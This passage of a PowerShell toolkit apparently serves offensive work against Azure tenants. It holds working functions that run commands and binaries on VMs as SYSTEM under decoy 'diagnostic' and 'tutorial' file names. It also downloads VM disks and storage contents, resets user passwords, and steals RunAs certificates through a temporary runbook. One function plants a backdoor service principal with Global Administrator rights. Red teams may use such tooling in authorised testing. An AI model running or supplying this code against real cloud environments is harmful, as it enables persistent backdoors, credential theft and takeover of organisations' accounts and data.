		Write-Error "Usage: Export-KeyVaultContent -VaultName VaultTest -Type Key -Name Testkey1234 -OutFilePath C:\Temp" -Category InvalidArgument
	}
}
    
function Show-AzureStorageContent
{
<#
.SYNOPSIS
    Lists all available storage containers, shares, and tables
.PARAMETER

    All- List all storage account contents
    StorageAccountName - Name of a specific account

.EXAMPLE
    Show-AzureStorageContent -All
    Show-AzureStorageContent -StorageAccountName TestAcct
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$false)][String]$StorageAccountName = $null,
     [Parameter(Mandatory=$false)][Switch]$All = $null)
    
    If($All)
    {
        $accounts = Get-AzStorageAccount
        ForEach($account in $accounts)
        {
            $obj = New-Object -TypeName psobject
            $obj | Add-Member -MemberType NoteProperty -Name StorageAccountName -Value $account.StorageAccountName
            $obj | Add-Member -MemberType NoteProperty -Name ResourceGroup -Value $account.ResourceGroupname
            $Containers = Get-AzStorageAccount -Name $account.StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageContainer           
		    $obj | Add-Member -MemberType NoteProperty -Name ContainerName -Value $Containers.Name
            $obj | Add-Member -MemberType NoteProperty -Name ContainerPublicAccess -Value $Containers.PublicAccess
            $obj | Add-Member -MemberType NoteProperty -Name LastModified -Value $Containers.LastModified
            $Blobs = Get-AzStorageAccount -Name $account.StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageContainer | Get-AzStorageBlob
            $obj | Add-Member -MemberType NoteProperty -Name BlobName -Value $Blobs.Name
            $obj | Add-Member -MemberType NoteProperty -Name BlobSize -Value $Blobs.Length
            $obj | Add-Member -MemberType NoteProperty -Name BlobContentType -Value $Blobs.ContentType
            $obj | Add-Member -MemberType NoteProperty -Name BlobHomeContainer -Value $Blobs.Context.StorageA
            $Shares = Get-AzStorageAccount -Name $account.StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageShare
            $obj | Add-Member -MemberType NoteProperty -Name ShareName -Value $Shares.name
            $Files = Get-AzStorageAccount -Name $account.StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageShare | Get-AzStorageFile
            $obj | Add-Member -MemberType NoteProperty -Name FileName -Value $Files.Name
            $obj | Add-Member -MemberType NoteProperty -Name HomeShare -Value $Files.ShareDirectoryClient.ShareName
            $obj
        }
    }
    If($StorageAccountName)
    {
        $account = Get-AzStorageAccount -Name $StorageAccountName
        $obj = New-Object -TypeName psobject
        $obj | Add-Member -MemberType NoteProperty -Name StorageAccountName -Value $account.StorageAccountName
        $obj | Add-Member -MemberType NoteProperty -Name ResourceGroup -Value $account.ResourceGroupname
        $Containers = Get-AzStorageAccount -Name $StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageContainer           
		$obj | Add-Member -MemberType NoteProperty -Name ContainerName -Value $Containers.Name
        $obj | Add-Member -MemberType NoteProperty -Name ContainerPublicAccess -Value $Containers.PublicAccess
        $obj | Add-Member -MemberType NoteProperty -Name LastModified -Value $Containers.LastModified
        $Blobs = Get-AzStorageAccount -Name $StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageContainer | Get-AzStorageBlob
        $obj | Add-Member -MemberType NoteProperty -Name BlobName -Value $Blobs.Name
        $obj | Add-Member -MemberType NoteProperty -Name BlobSize -Value $Blobs.Length
        $obj | Add-Member -MemberType NoteProperty -Name BlobContentType -Value $Blobs.ContentType
        $obj | Add-Member -MemberType NoteProperty -Name BlobHomeContainer -Value $Blobs.Context.StorageA
        $Shares = Get-AzStorageAccount -Name $StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageShare
        $obj | Add-Member -MemberType NoteProperty -Name ShareName -Value $Shares.name
        $Files = Get-AzStorageAccount -Name $StorageAccountName -ResourceGroup $account.ResourceGroupname | Get-AzStorageShare | Get-AzStorageFile
        $obj | Add-Member -MemberType NoteProperty -Name FileName -Value $Files.Name
        $obj | Add-Member -MemberType NoteProperty -Name HomeShare -Value $Files.ShareDirectoryClient.ShareName
        $obj    
    } 
    If(!$All -and !$StorageAccountName)
    {
        Write-Host "Usage:" -ForegroundColor Red
        Write-Host "Show-AzureStorageContent -StorageAccountName TestAcct" -ForegroundColor Red
        Write-Host "Show-AzureStorageContent -All" -ForegroundColor Red
    }

}

function Get-AzureStorageContent
{
<#
.SYNOPSIS
    Gathers a file from a specific blob or File Share

.PARAMETER
    Share - Name of the share the file is located in 
    Path - Path of the file in the target share
    Blob - Name of the blob the file is located in 
    StorageAccountName - Name of a specific account
    ResourceGroup - The RG the Storage account is located in
    ContainerName - Name of the Container the file is located in
    
.EXAMPLE
    Get-AzureStorageContent
    Get-AzureStorageContent -StorageAccountName TestAcct -Type Container 
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$true)][String]$StorageAccountName = $null,
     [Parameter(Mandatory=$true)][String]$ResourceGroup = $null,
     [Parameter(Mandatory=$false)][String]$Share = $null,
     [Parameter(Mandatory=$false)][String]$Path = $null,
     [Parameter(Mandatory=$false)][String]$Blob = $null,
     [Parameter(Mandatory=$false)][String]$ContainerName = $null)
    
    If($ContainerName -and $Blob)
    {
        Get-AzStorageAccount -Name $StorageAccountName -ResourceGroupName $ResourceGroup | Get-AzStorageBlobContent -Container $ContainerName -Blob $Blob
    }
    If($Share -and $Path)
    {

       Get-AzStorageAccount -Name $StorageAccountName -ResourceGroupName $ResourceGroup | Get-AzStorageFileContent -ShareName $Share -Path $Path
    }
}

function Get-AzureVMDisk
{
<#
.SYNOPSIS 
    Generates a link to download a Virtual Machiche's disk. The link is only available for 24 hours.
.PARAMETER
    -DiskName

.EXAMPLE   
    Get-AzureVMDisk -DiskName AzureWin10_OsDisk_1_c2c7da5a0838404c84a70d6ec097ebf5     
#>
     [CmdletBinding()]
     Param(
     [Parameter(Mandatory=$true)][String]$DiskName = $null)

    $Disk = Get-AzDisk -Name $DiskName
    $URI = Grant-AzDiskAccess -ResourceGroupName $Disk.ResourceGroupName -DiskName $DiskName -Access Read -DurationInSecond 86400
    If($URI)
    {
        Write-Host "Successfully got a link. Link is active for 24 Hours" -ForegroundColor Yellow
        $URI
    }   
}

function Get-AzureRunbookContent
{
 <#
.SYNOPSIS
    Gets a specific Runbook and displays its contents. 

.PARAMETER
    -Runbook (Name of Runbook)
    -All 
    -OutFilePath (Where to save Runbook)

.EXAMPLE
    Get-AzureRunbookContent -Runbook Runbooktest -OutFilePath 'C:\temp'
    Get-AzureRunbookContent -All -OutFilePath 'C:\temp

#>
    [CmdletBinding()]
     Param(
    [Parameter(Mandatory=$false)][String]$Runbook = $null,
    [Parameter(Mandatory=$false)][String]$OutFilePath = $null,
    [Parameter(Mandatory=$false)][Switch]$All = $null)
	If(!$OutFilePath){
	$OutFilePath = pwd
	}
    If($Runbook)
    {
        $Book = Get-AzAutomationAccount | Get-AzAutomationRunbook | Where-Object {$_.Name -eq $Runbook}
        Export-AzAutomationRunbook -ResourceGroupName $Book.ResourceGroupName -AutomationAccountName $Book.AutomationAccountName -Name $Runbook -OutputFolder "$OutFilePath" -Force
		$OutFilePath
    }
    If($All)
    {
        $Books = Get-AzAutomationAccount | Get-AzAutomationRunbook
        ForEach($Book in $Books)
        {
            Export-AzAutomationRunbook -ResourceGroupName $Book.ResourceGroupName -AutomationAccountName $Book.AutomationAccountName -Name $Book.Name -OutputFolder "$OutFilePath" -Force
        }
    }
    If(!$All -and !$Runbook)
    {
      Write-Host "Usage:" -ForegroundColor Red  
      Write-Host "Get-AzureRunbookContent -Runbook Runbooktest -OutFilePath 'C:\temp'" -ForegroundColor Red  
      Write-Host "Get-AzureRunbookContent -All -OutFilePath 'C:\temp" -ForegroundColor Red  
    }
}

function Restart-AzureVM
{
 <#
.SYNOPSIS
    Restarts an Azure VM

.PARAMETER
    -Name (Name of VM)

.EXAMPLE
    Restart-AzureVM -Name Testvm01

#>
    [CmdletBinding()]
     Param(
    [Parameter(Mandatory=$true)][String]$Name = $null)
	$vm = Get-AzVM -name $Name
	Restart-AzVM -Name $Name -ResourceGroupName $vm.ResourceGroupName
}

function Start-AzureRunbook
{
<#
.SYNOPSIS
    Starts a Runbook
.PARAMETER
    -Runbook (Name of runbook)
.EXAMPLE
    Start-AzureRunbook  -Runbook TestRunbook
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$Runbook = $null)

    $Book = Get-AzAutomationAccount | Get-AzAutomationRunbook | Where-Object {$_.Name -eq $Runbook}
    Start-AzAutomationRunbook -ResourceGroupName $Book.ResourceGroupName -AutomationAccountName $Book.AutomationAccountName -Name $Runbook   
}

function Invoke-AzureRunCommand
{
 <#
.SYNOPSIS
    Will run a command or script on a specified VM

.PARAMETER
    -Script 
    -Command 
    -VM

.EXAMPLE
    Invoke-AzureRunCommand -VM AzureWin10 -Command whoami
    Invoke-AzureRunCommand -VM AzureWin10 -Script 'C:\temp\test.ps1'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Script = $null,
    [Parameter(Mandatory=$false)][String]$Command = $null,
    [Parameter(Mandatory=$true)][String]$VMName = $null)

    if($VMName)
    {
        $details = Get-AzVM -Name $VMName

        If($Command)
        {

            If($details.OSProfile.WindowsConfiguration)
            {
                $new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
                $path = $new.DirectoryName + '\' + $new.Name  
                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
                $result.value.Message
                rm $path

            }
            If($details.OSProfile.LinuxConfiguration)
            {
                $new = New-Item -Name "LinuxDiagnosticTest.sh" -ItemType "file" -Value $Command
                $path = $new.DirectoryName + '\' + $new.Name  
                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $path
                $result.value.Message
                rm $path
            }            
        }
        If($Script)
        {
            If($details.OSProfile.WindowsConfiguration)
            {
                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $Script
                $result.value.Message
            }
            If($details.OSProfile.LinuxConfiguration)
            {
                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $Script
                $result.value.Message
            }            
        }
        If(!$Script -and !$Command)
        {
          Write-Host "Usage:" -ForegroundColor Red
          Write-Host "Invoke-AzureRunCommand -VMName AzureWin10 -Command whoami"
          Write-Host "Invoke-AzureRunCommand -VMName AzureWin10 -Script 'C:\temp\test.ps1'"
        }
    }
}

function Invoke-AzureRunProgram
{
 <#
.SYNOPSIS
    Will run a given binary on a specified VM

.PARAMETER
    -File (Provide full path)
    -VMName (Name of VM to run file on. Obviously must be Windows with .net installed)

.EXAMPLE
    Invoke-AzureRunProgram -VMName AzureWin10 -File C:\path\to\.exe"
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$File = $null,
    [Parameter(Mandatory=$true)][String]$VMName = $null)

    if($VMName -and $File -match '\\')
    {
        $details = Get-AzVM -Name $VMName
        If($details.OSProfile.WindowsConfiguration)
        {
            $ByteArray = [System.IO.File]::ReadAllBytes($File)
            $Base64String = [System.Convert]::ToBase64String($ByteArray) | Out-File temp.ps1 #This is necessary because raw output is too long for a command to be passed over az vm run-command invoke, so it must be in a script. 
            Write-Host "Uploading Payload..."
			$upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath temp.ps1 -verbose
			$command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes("test.exe",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\test.exe'
            $new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $command -Force
            $path = $new.DirectoryName + '\' + $new.Name  
			Write-Host "Executing Payload..."
            $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
            $result.value.Message 
            rm $path           
        }

        If($details.OSProfile.LinuxConfiguration)
        {
            $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $File
            $result.value.Message
        }       
    }
    elseif(!$VMName -or $File -notmatch '\\')
    { 
        Write-Host "-File must contain the full path to the file" -ForegroundColor Red
        Write-Host "Usage: Invoke-AzureRunProgram -VMName AzureWin10 -File C:\path\to\.exe" -ForegroundColor Red
    }    
}

function Invoke-AzureRunMSBuild
{
 <#
.SYNOPSIS
    Will run a supplied MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Requires Contributor Role. Will run as SYSTEM.

.PARAMETER
    -File (MSBuild file or path to it. If in current directory do NOT use .\ )
    -VMName (Name of VM to run file on. Obviously must be Windows with .NET installed)

.EXAMPLE
    Invoke-AzureRunMSBuildd -VMName AzureWin10 -File 'C:/path/to/payload/onyourmachine.xml'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$File = $null,
    [Parameter(Mandatory=$true)][String]$VMName = $null)

    $details = Get-AzVM -Name $VMName
    $upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $File -verbose
    If($upload.Value)
    {
        $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name'
        $new = New-Item -Name "WindowsDiagnosticMSBuild.ps1" -ItemType "file" -Value $Command -Force
        $path = $new.DirectoryName + '\' + $new.Name  
        $run = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
        $run.value.Message 
        rm $path
    }
}

function Invoke-AzureCommandRunbook
{
<#
.SYNOPSIS 
    Will execute a supplied command or script from a Runbook if the Runbook is configured with a "RunAs" account
	
.PARAMETER
    -AutomationAccount
	-ResourceGroup
	-VM
	-Command
	-Script
.EXAMPLE
    Invoke-AzureCommandRunbook -AutomationAccount TestAccount -VMName Win10Test -Command whoami
	Invoke-AzureCommandRunbook -AutomationAccount TestAccount -VMName Win10Test -Script "C:\temp\test.ps1"
#>
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$True)][String]$AutomationAccount = $null,
	[Parameter(Mandatory=$True)][String]$VMName = $null,
	[Parameter(Mandatory=$false)][String]$Script = $null,
	[Parameter(Mandatory=$false)][String]$Command = $null)
	
	$OS = Get-AzVM -Name $VMName
    $AA = Get-AzAutomationAccount | Where-Object {$_.AutomationAccountName -eq "$AutomationAccount"}    
    $ResourceGroup = $AA.ResourceGroupName
    $VMResourceGroup = $OS.ResourceGroupName
    $Modules = Get-AzAutomationModule -ResourceGroupName $ResourceGroup -AutomationAccountName $automationaccount
    If($Modules.Name -notcontains 'AzureRM.Compute' -and $Modules.Name -notcontains 'AzureRM.profile')
    {
	New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Compute" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.compute.5.9.1.nupkg -ResourceGroupName $ResourceGroup | Out-Null
    New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Profile" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.profile.5.8.3.nupkg -ResourceGroupName $ResourceGroup | Out-Null
    }
	If($OS.OSProfile.WindowsConfiguration)
	{
		$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data3 = 'Add-AzureRmAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId -ApplicationId $servicePrincipalConnection.ApplicationId -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data4 = 'New-Item C:\temp\test.ps1' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data5 = "echo $Command >> C:\temp\test.ps1" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunPowerShellScript -ScriptPath "C:\temp\test.ps1"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data7 = '$z.Value[0].Message' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		Write-Host "Uploading Runbook..." -ForegroundColor Green
		Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
		Write-Host "Publishing Runbook..." -ForegroundColor Green
		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell	| Out-Null
		Write-Host "Starting Runbook..." -ForegroundColor Green
		$start = Start-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell	
		$jobid = $start.JobId
		$timer = [Diagnostics.Stopwatch]::StartNew()
		$value = $null
		$Timeout = 180
		While (!$value -and ($timer.Elapsed.TotalSeconds -lt $Timeout))
		{
			$ErrorActionPreference = "SilentlyContinue"
			Write-Host "Waiting for Runbook Output..." -ForegroundColor Green
			Start-Sleep -s 10
			$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
			$value = $record.Value[2].value

		}
		$timer.Stop()
		$value
		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell -Force
		rm AzureAutomationTutorialPowerShell.ps1
	}
	else
	{
		$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append BashAutomationTutorial.sh
		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append BashAutomationTutorial.sh
		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append BashAutomationTutorial.sh
		$data3 = 'Add-AzureRmAccount ` -ServicePrincipal ` -TenantId $servicePrincipalConnection.TenantId ` -ApplicationId $servicePrincipalConnection.ApplicationId ` -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append BashAutomationTutorial.sh
		$data4 = 'New-Item test.sh' | Out-File -Append BashAutomationTutorial.sh
		$data5 = "echo $Command >> test.sh" | Out-File -Append BashAutomationTutorial.sh
		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunShellScript -ScriptPath "./test1.sh"' | Out-File -Append BashAutomationTutorial.sh
		$data7 = '$z.Value[0].Message' | Out-File -Append BashAutomationTutorial.sh
		Write-Host "Uploading Runbook..." -ForegroundColor Green
		Import-AzAutomationRunbook -Path .\BashAutomationTutorial.sh -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell
		Write-Host "Publishing Runbook..." -ForegroundColor Green
		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial
		Write-Host "Starting Runbook..." -ForegroundColor Green
		$start = Start-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial	
		$jobid = $start.JobId
		$timer = [Diagnostics.Stopwatch]::StartNew()
		$value = $null
		$Timeout = 180
		While (!$value -and ($timer.Elapsed.TotalSeconds -lt $Timeout))
		{
			$ErrorActionPreference = "SilentlyContinue"
			Write-Host "Waiting for Runbook Output..." -ForegroundColor Green
			Start-Sleep -s 10
			$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
			$value = $record.Value[2].value

		}
		$value
		$timer.Stop()
		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial -Force
		rm BashAutomationTutorial.sh
	}
}

function New-AzureBackdoor
{
 <#
.SYNOPSIS
    Creates a back door by creating a service principal and making it a Global Administrator.

.PARAMETER
    -Password (What the password will be for the service principal.)

.EXAMPLE
    New-AzureBackdoor -Username 'testserviceprincipal' -Password 'Password!'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$Username = $null,
    [Parameter(Mandatory=$true)][String]$Password = $null)

    Import-Module Az.Resources
    $Headers = Get-AzureGraphToken
    $credentials = New-Object -TypeName Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential -Property @{StartDate=Get-Date; EndDate=Get-Date -Year 2024; Password=$Password}
    $make = New-AzADServicePrincipal -DisplayName $Username -PasswordCredential $credentials
    $UserId = $make.Id
	$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/4dda258a-4568-4579-abeb-07709e34e307/members/$ref'
$body = @"
{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UserId"
}
"@
	$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri | Convertto-Json
	If($req)
    {
        $Context = Get-AzContext
        $App = Get-AzADApplication -DisplayName $Username
        $aid = $app.ApplicationId
		Write-Host "Success! You can now login as the service principal using the following commands:" -ForegroundColor Green
		Write-Host ""
		Write-Host '$Credential = Get-Credential; Connect-AzAccount -Credential $Credential -Tenant '$Context.Tenant.Id' -ServicePrincipal' -ForegroundColor Yellow
		Write-Host ""
		Write-Host 'Be sure to use the Application ID as the username when prompted by Get-Credential. The application ID is: '$aid'' -ForegroundColor Red
    }
}

function Get-AzureRolePermission
{
<#
.SYNOPSIS 
    Finds all roles with a certain permission
	
.PARAMETER
    -Permission

.EXAMPLE
    Get-AzureRolePermission -Permission 'virtualMachines/*'
#>
	[CmdletBinding()]
	 Param(
	[Parameter(Mandatory=$true)][String]$Permission = $null)

	$roles= Get-AzRoleDefinition
	ForEach($role in $roles)
	{
		If($role.roleType -eq "BuiltInRole")
		{
			$rolename = $role.roleName 
			if ($role.permissions.actions -match "$Permission")
			{		
				$role
			}
		}
	}
}

function Get-AzureRunAsCertificate
{
<#
.SYNOPSIS 
    Will gather a RunAs accounts certificate if one is being used by an automation account, which can then be used to login as that account. By default, RunAs accounts are contributors over the subscription. This function does take a minute to run.
	
.PARAMETER
    -AutomationAccount

.EXAMPLE
    Get-AzureRunAsCertificate -AutomationAccount TestAccount
#>

	[CmdletBinding()]
	 Param(
	[Parameter(Mandatory=$true)][String]$AutomationAccount = $null)
    
    $CurrentUser = Get-AzContext
    $AA = Get-AzAutomationAccount | Where-Object {$_.AutomationAccountName -eq "$AutomationAccount"}   
    $name = $AA.AutomationAccountName
    $AppData = Get-AzADApplication | Where-Object {$_.DisplayName -match "$name"}
    $ResourceGroup = $AA.ResourceGroupName
	$data1 = '$RunAsCert = Get-AutomationCertificate -Name "AzureRunAsCertificate"' | Out-File  AutomationTutorialPowerShell.ps1 -Force
	$data2 = '$CertPath = Join-Path $env:temp  "AzureRunAsCertificate.pfx"' | Out-File -Append AutomationTutorialPowerShell.ps1
	$data3 = '$Cert = $RunAsCert.Export("pfx",$Password)' | Out-File -Append AutomationTutorialPowerShell.ps1
	$data4 = '$Password = "YourStrongPasswordForTheCert" ' | Out-File -Append AutomationTutorialPowerShell.ps1
	$data5 = 'Set-Content -Value $Cert -Path $CertPath -Force -Encoding Byte | Write-Verbose' | Out-File -Append AutomationTutorialPowerShell.ps1
    $data6 = '$RunAsCert' | Out-File -Append AutomationTutorialPowerShell.ps1
	$data6 = '[Convert]::ToBase64String([IO.File]::ReadAllBytes($CertPath))' | Out-File -Append AutomationTutorialPowerShell.ps1
	Write-Host "Uploading Runbook..." -ForegroundColor Green
	Import-AzAutomationRunbook -Path .\AutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
	Write-Host "Publishing Runbook..." -ForegroundColor Green
	Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell| Out-Null
	Write-Host "Starting Runbook..." -ForegroundColor Green
	$start = Start-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell	
	$jobid = $start.JobId
	Start-Sleep -s 10
	$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
	$Timeout = 120
	$timer = [Diagnostics.Stopwatch]::StartNew()
	While (!$record -and ($timer.Elapsed.TotalSeconds -lt $Timeout))
	{
	Write-Host "Waiting for Runbook Output..." -ForegroundColor Yellow
	Start-Sleep -s 10
	$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
	}
	$timer.Stop()	
    $thumbprint = $record.Value.Thumbprint
	$tenant = $CurrentUser.Tenant.Id
	$appID = $AppData.ApplicationId
	$b64 = $record.Value.value
	New-item AzureRunAsCertificate.pfx -Force | Out-Null
	$Password = "YourStrongPasswordForTheCert"
	$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
	$d = pwd
	$CertPath = $d.Path + "\AzureRunAsCertificate.pfx"
	[IO.File]::WriteAllBytes($CertPath, [Convert]::FromBase64String($b64))
	Write-Host "Importing Certificate" -ForegroundColor Green
	$import = Import-PfxCertificate -FilePath $CertPath -CertStoreLocation Cert:\LocalMachine\My -Password $SecurePassword -Exportable
	Write-Host "Done! To login as the service principal, copy+paste the following command: " -ForegroundColor Green
	Write-Host ""
	Write-Host "Connect-AzAccount -CertificateThumbprint "$thumbprint" -ApplicationId "$appID" -Tenant "$tenant"" -ForegroundColor Green
	Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AutomationTutorialPowerShell -Force
	rm AutomationTutorialPowerShell.ps1
}

function Get-AzureSQLDB
{
<#
.SYNOPSIS 
Lists the available SQL Databases on a server

.PARAMETERES

-All
-Server

.EXAMPLE

Get-AzureSQLDB -All
Get-AzureSQLDB -Server 'SQLServer01'

#>
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$false)][String]$ServerName = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $null)
	If($All)
    {
	    $Servers = Get-AzSqlServer	
	    ForEach($Server in $Servers)
	    {
        $obj = New-Object -TypeName psobject		 	
	    $obj | Add-Member -MemberType NoteProperty -Name ServerName -Value $Server.ServerName
        $obj | Add-Member -MemberType NoteProperty -Name ServerAdmin -Value $Server.SqlAdministratorLogin
        $obj | Add-Member -MemberType NoteProperty -Name AdminPassword -Value $Server.SqlPassword
        $obj | Add-Member -MemberType NoteProperty -Name FQDN -Value $Server.FullyQualifiedDomainName
	    $db = $Server | Get-AzSqlDatabase
        $obj | Add-Member -MemberType NoteProperty -Name Databases -Value $db.DatabaseName
        $obj
	    }
    }
    If($ServerName)
    {
        $data = Get-AzSqlServer -ServerName $ServerName	 
        $obj = New-Object -TypeName psobject		 	
        $obj | Add-Member -MemberType NoteProperty -Name ServerName -Value $data.ServerName
        $obj | Add-Member -MemberType NoteProperty -Name ServerAdmin -Value $data.SqlAdministratorLogin
        $obj | Add-Member -MemberType NoteProperty -Name AdminPassword -Value $data.SqlPassword
        $obj | Add-Member -MemberType NoteProperty -Name FQDN -Value $data.FullyQualifiedDomainName
        $db = $data| Get-AzSqlDatabase
        $obj | Add-Member -MemberType NoteProperty -Name Databases -Value $db.DatabaseName
        $obj
    }
    If(!$All -and !$ServerName)
    {
        Write-Host "Usage:" -ForegroundColor Red
        Write-Host "Get-AzureSQLDB -All" -ForegroundColor Red
        Write-Host "Get-AzureSQLDB -Server 'SQLServer01'" -ForegroundColor Red
    }
}

function Set-AzureUserPassword
{
<#
.SYNOPSIS 
Sets a user's password
	
.PARAMETER
Password - New password for user
Username - Name of user   

.EXAMPLE

Set-AzureUserPassword -Username john@contoso.com -Password newpassw0rd1
#>
	[CmdletBinding()]
	 Param(
	[Parameter(Mandatory=$True)][String]$Password = $null,
	[Parameter(Mandatory=$True)][String]$Username = $null)

    $SecurePassword =  ConvertTo-SecureString $Password -AsPlainText -Force
	$Set = Update-AzADUser -UserPrincipalName $Username -Password $SecurePassword
	If($Set)
	{
	Write-Host "Successfully set $Username password to $Password"
	}
}

function Get-AzureRunAsAccounts
{
<#
.SYNOPSIS 
Lists all RunAs accounts for all Automation Accounts

.EXAMPLE
Get-AzureRunAsAccounts
#>

    $obj = New-Object -TypeName psobject		 	
    $apps = Get-AzADApplication | Where-Object {$_.HomePage -Match 'automationAccounts'}
    If($apps){
	$name = $apps.DisplayName.Split("_")[0]
	$aa = Get-AzAutomationAccount | Where-object {$_.AutomationAccountName -match $name}
	$aaname = $aa.AutomationAccountName
